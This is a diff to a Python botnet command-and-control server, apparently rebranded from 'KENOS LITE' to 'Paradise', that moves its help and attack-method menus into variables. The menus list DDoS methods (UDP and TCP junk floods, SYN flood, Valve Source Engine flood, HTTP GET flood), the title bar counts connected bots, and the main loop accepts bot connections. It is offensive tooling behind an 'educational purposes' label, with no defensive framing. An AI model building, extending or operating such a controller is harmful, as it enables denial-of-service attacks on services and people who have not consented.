@@ -14,11 +14,33 @@ import socket, threading, sys, time, ipaddress
 from colorama import Fore, init
 
 about = """
-┌────────────────────────────┐
-│ * Author : D3fe4ted        │
-│ * Coded in Python          │
-│ * For educational purposes │
-└────────────────────────────┘"""
+    ┌────────────────────────────┐
+    │ * Author : D3fe4ted        │
+    │ * Coded in Python          │
+    │ * For educational purposes │
+    └────────────────────────────┘
+"""
+
+help = """
+    ┌───────────────────────────────────────┐
+    │ HELP: Shows list of commands          │
+    │ METHODS: Shows list of attack methods │
+    │ CLEAR: Clears the screen              │
+    │ LOGOUT: Disconnects from the net      │
+    └───────────────────────────────────────┘
+"""
+
+methods = """
+    ┌───────────┬──────────────────────────────┐
+    │  Methods  │          Description         │
+    ├───────────┼──────────────────────────────┤
+    │ * .udp    │  UDP Junk Flood              │
+    │ * .tcp    │  TCP Junk Flood              │
+    │ * .tcpsyn │  TCP SYN Flood               │
+    │ * .vse    │  Valve Source Engine Flood   │
+    │ * .http   │  HTTP GET Request Flood      │
+    └───────────┴──────────────────────────────┘
+"""
 
 bots = {}
 ansi_clear = '\033[2J\033[H'
@@ -95,7 +117,7 @@ def ping():
 def update_title(client, username):
     while 1:
         try:
-            send(client, f'\33]0;KENOS LITE | NPCS: {len(bots)} | Logged in as: {username}\a', False)
+            send(client, f'\33]0;Paradise | Boats: {len(bots)} | Logged in as: {username}\a', False)
             time.sleep(2)
         except:
             client.close()
@@ -119,30 +141,16 @@ def command_line(client):
             
             if command == 'ABOUT':
                 send(client, about)
-                send(client, '')
             if command == 'HELP':
-                send(client, '┌───────────────────────────────────────┐')
-                send(client, '│ HELP: Shows list of commands          │')
-                send(client, '│ METHODS: Shows list of attack methods │')
-                send(client, '│ CLEAR: Clears the screen              │')
-                send(client, '│ LOGOUT: Disconnects from CnC server   │')
-                send(client, '└───────────────────────────────────────┘')
-                send(client, '')
+                send(client, help)
             elif command == 'METHODS':
-                send(client, '┌─────────────────────────────────────────────────┐')
-                send(client, '│ * .syn - TCP SYN Flood                          │')
-                send(client, '│ * .tcp - TCP Junk Flood                         │')
-                send(client, '│ * .udp - UDP Junk Flood                         │')
-                send(client, '│ * .vse - UDP Valve Source Engine Specific Flood │')
-                send(client, '│ * .http - HTTP GET Request Flood                │')
-                send(client, '└─────────────────────────────────────────────────┘')
-                send(client, '')
+                send(client, methods)
             elif command == 'CLEAR':
                 send(client, ansi_clear, False)
                 for x in banner.split('\n'):
                     send(client, x)
             elif command == 'LOGOUT':
-                send(client, '* Successfully Logged out\n\nSession Ended\n')
+                send(client, '* Successfully Logged out\n')
                 time.sleep(1)
                 break
             
@@ -326,9 +334,9 @@ def main():
 
     sock.listen()
 
-    threading.Thread(target=ping).start() # start keepalive thread
+    threading.Thread(target=ping).start() # Start keepalive thread
 
-    # accept all connections
+    # Accept all connections
     while 1:
         threading.Thread(target=handle_client, args=[*sock.accept()]).start()
 
